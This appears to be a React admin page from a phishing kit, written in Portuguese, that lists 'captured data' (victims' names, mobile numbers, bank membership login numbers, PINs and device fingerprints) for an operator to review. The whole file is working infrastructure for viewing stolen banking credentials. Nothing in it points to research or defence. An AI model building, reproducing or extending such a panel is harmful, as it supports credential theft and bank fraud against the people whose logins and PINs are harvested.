import { useAuth } from "@/_core/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { getLoginUrl } from "@/const";
import { trpc } from "@/lib/trpc";
import { Loader2 } from "lucide-react";
import { useLocation } from "wouter";

export default function Admin() {
  const { user, loading: authLoading, isAuthenticated } = useAuth();
  const [, setLocation] = useLocation();
  const { data: capturedData, isLoading, error } = trpc.capture.list.useQuery(undefined, {
    enabled: isAuthenticated && user?.role === 'admin',
  });

  if (authLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  if (!isAuthenticated) {
    window.location.href = getLoginUrl();
    return null;
  }

  if (user?.role !== 'admin') {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle>Acesso Negado</CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-muted-foreground mb-4">
              Você não tem permissão para acessar esta página.
            </p>
            <Button onClick={() => setLocation("/")}>Voltar</Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background p-8">
      <div className="container mx-auto">
        <Card>
          <CardHeader>
            <CardTitle className="text-2xl">Painel de Administração - Dados Capturados</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading && (
              <div className="flex justify-center py-8">
                <Loader2 className="h-8 w-8 animate-spin" />
              </div>
            )}

            {error && (
              <div className="text-red-500 py-4">
                Erro ao carregar dados: {error.message}
              </div>
            )}

            {capturedData && capturedData.length === 0 && (
              <div className="text-muted-foreground py-8 text-center">
                Nenhum dado capturado ainda.
              </div>
            )}

            {capturedData && capturedData.length > 0 && (
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>ID</TableHead>
                      <TableHead>Nome</TableHead>
                      <TableHead>Telemóvel</TableHead>
                      <TableHead>Nº Adesão</TableHead>
                      <TableHead>PIN</TableHead>
                      <TableHead>Fingerprint</TableHead>
                      <TableHead>Data</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {capturedData.map((item) => (
                      <TableRow key={item.id}>
                        <TableCell>{item.id}</TableCell>
                        <TableCell>{item.nome}</TableCell>
                        <TableCell>{item.telemovel}</TableCell>
                        <TableCell>{item.numeroAdesao}</TableCell>
                        <TableCell className="font-mono">{item.pin}</TableCell>
                        <TableCell className="text-xs truncate max-w-[200px]">
                          {item.fingerprint || '-'}
                        </TableCell>
                        <TableCell>
                          {new Date(item.createdAt).toLocaleString('pt-BR')}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
